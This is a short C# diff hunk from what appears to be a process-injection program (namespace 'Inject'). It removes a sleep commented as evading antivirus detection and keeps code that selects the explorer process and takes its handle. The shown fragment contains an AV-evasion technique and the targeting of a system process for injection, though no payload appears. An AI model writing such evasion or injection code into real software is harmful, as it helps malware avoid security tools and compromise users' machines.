@@ -47,9 +47,6 @@ namespace Inject
         static void Main(string[] args)
         {
 
-            // We're sleeping for 10 seconds to evade AV detection
-            Thread.Sleep(10000);
-
             Process[] targetProcess = Process.GetProcessesByName("explorer");
             IntPtr htargetProcess = targetProcess[0].Handle;
 
